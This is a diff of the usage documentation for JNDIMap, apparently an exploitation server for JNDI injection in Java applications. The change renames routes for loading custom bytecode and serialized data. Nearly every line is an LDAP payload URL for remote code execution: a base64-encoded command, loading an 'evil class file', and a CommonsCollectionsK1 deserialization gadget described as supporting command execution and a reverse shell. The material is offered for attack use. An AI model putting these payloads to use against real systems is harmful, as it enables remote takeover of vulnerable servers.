@@ -73,7 +73,7 @@ ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 # load custom class bytecode
 
 # load via URL parameters
-ldap://127.0.0.1:1389/Basic/FromCode/<base64-url-encoded-java-bytecode>
+ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
 # load from the server running JNDIMap
 ldap://127.0.0.1:1389/Basic/FromPath/<base64-url-encoded-path-to-evil-class-file>
 
@@ -324,7 +324,11 @@ JNDIMap has built-in the following gadgets, and also supports custom data deseri
 
 ```bash
 # custom data deserialization
-ldap://127.0.0.1:1389/Deserialize/<base64-url-encoded-serialize-data>
+
+# load via URL parameters
+ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialized-data>
+# load from the server running JNDIMap
+ldap://127.0.0.1:1389/Deserialize/FromPath/<base64-url-encoded-path-to-serialized-data>
 
 # CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and native reverse shell
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
